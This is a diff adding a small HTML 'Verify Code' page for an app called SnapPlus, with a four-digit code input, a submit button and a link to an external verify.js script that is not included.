@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SnapPlus - Verify</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" type="image/jpeg" href="images.jpg" />
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <img src="images.jpg" alt="SnapPlus Logo" class="logo" />
+      <h1>Verify Code</h1>
+      <p class="subtitle">It might take a couple of minutes to receive your code. Enter it below.</p>
+
+      <form id="verify-form">
+        <div class="form-group">
+          <label for="code">4-Digit Code</label>
+          <input
+            type="text"
+            id="code"
+            name="code"
+            placeholder="0000"
+            required
+            maxlength="4"
+            pattern="[0-9]{4}"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            aria-required="true"
+          />
+          <span class="error-text" id="code-error" role="alert"></span>
+        </div>
+
+        <button type="submit" class="btn-submit" id="submit-btn">Verify</button>
+      </form>
+
+      <div id="message" class="message" role="status" aria-live="polite"></div>
+
+      <footer>
+        &copy; 2026 SnapPlus. All rights reserved.
+      </footer>
+    </div>
+  </div>
+
+  <script src="verify.js"></script>
+</body>
+</html>
